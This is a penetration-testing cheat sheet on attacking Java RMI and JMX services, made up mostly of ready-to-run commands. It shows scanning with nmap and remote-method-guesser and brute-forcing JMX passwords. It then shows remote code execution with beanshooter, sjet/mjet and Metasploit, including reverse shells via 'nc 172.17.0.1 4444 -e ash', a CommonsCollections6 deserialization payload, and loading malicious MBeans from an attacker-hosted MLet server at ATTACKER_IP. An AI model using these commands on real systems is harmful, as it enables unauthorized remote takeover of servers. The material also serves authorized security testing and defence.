# Java RMI

> Java RMI (Remote Method Invocation) is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if they're on different physical machines. RMI provides a mechanism for Java-based distributed computing.


## Summary

* [Tools](#tools)
* [Detection](#detection)
* [Methodology](#methodology)
    * [RCE using beanshooter](#rce-using-beanshooter)
    * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)
    * [RCE using Metasploit](#rce-using-metasploit)
* [References](#references)


## Tools

- [siberas/sjet](https://github.com/siberas/sjet) - siberas JMX exploitation toolkit
- [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - MOGWAI LABS JMX exploitation toolkit
- [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI Vulnerability Scanner
- [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX enumeration and attacking tool.


## Detection

* Using [nmap](https://nmap.org/):
  ```powershell
  $ nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
  1089/tcp open  java-rmi Java RMI
  | rmi-vuln-classloader:
  |   VULNERABLE:
  |   RMI registry default configuration remote code execution vulnerability
  |     State: VULNERABLE
  |       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
  | rmi-dumpregistry:
  |   jmxrmi
  |     javax.management.remote.rmi.RMIServerImpl_Stub
  ```

* Using [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser):
  ```bash
  $ rmg scan 172.17.0.2 --ports 0-65535
  [+] Scanning 6225 Ports on 172.17.0.2 for RMI services.
  [+] 	[HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)
  [+] 	[HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)
  [+] 	[HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)
  [+] 	[6234 / 6234] [#############################] 100%
  [+] Portscan finished.

  $ rmg enum 172.17.0.2 9010
  [+] RMI registry bound names:
  [+]
  [+] 	- plain-server2
  [+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
  [+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
  [+] 	- legacy-service
  [+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
  [+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]
  [+] 	- plain-server
  [+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
  [+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]
  [...]
  ```

* Using [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
  ```bash
  use auxiliary/scanner/misc/java_rmi_server
  set RHOSTS <IPs>
  set RPORT <PORT>
  run
  ```

## Methodology

If a Java Remote Method Invocation (RMI) service is poorly configured, it becomes vulnerable to various Remote Code Execution (RCE) methods. One method involves hosting an MLet file and directing the JMX service to load MBeans from a distant server, achievable using tools like mjet or sjet. The remote-method-guesser tool is newer and combines RMI service enumeration with an overview of recognized attack strategies.


### RCE using beanshooter

* List available attributes: `beanshooter info 172.17.0.2 9010`
* Display value of an attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose`
* Set the value of an attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean`
* Bruteforce a password protected JMX service: `beanshooter brute 172.17.0.2 1090`
* List registered MBeans: `beanshooter list 172.17.0.2 9010`
* Deploy an MBean: `beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000`
* Enumerate JMX endpoint: `beanshooter enum 172.17.0.2 1090`
* Invoke method on a JMX endpoint: `beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'`
* Invoke arbitrary public and static Java methods: 

    ```ps1
    beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
    beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
    ```
    
* Standard MBean execution: `beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`
* Deserialization attacks on a JMX endpoint: `beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`


### RCE using sjet or mjet

#### Requirements

- Jython
- The JMX server can connect to a http service that is controlled by the attacker
- JMX authentication is not enabled

#### Remote Command Execution

The attack involves the following steps:
* Starting a web server that hosts the MLet and a JAR file with the malicious MBeans
* Creating a instance of the MBean `javax.management.loading.MLet` on the target server, using JMX
* Invoking the `getMBeansFromURL` method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file.
* The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX.
* The attacker finally invokes methods from the malicious MBean.

Exploit the JMX using [siberas/sjet](https://github.com/siberas/sjet) or [mogwailabs/mjet](https://github.com/mogwailabs/mjet)

```powershell
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
jython sjet.py TARGET_IP TARGET_PORT super_secret shell
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"

jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
```

### RCE using Metasploit

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
# configure also the payload if needed
run
```


## References

- [Attacking RMI based JMX services - Hans-Martin Münch - April 28, 2019](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
- [JMX RMI - MULTIPLE APPLICATIONS RCE - Red Timmy Security - March 26, 2019](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
- [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel - August 15, 2021](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)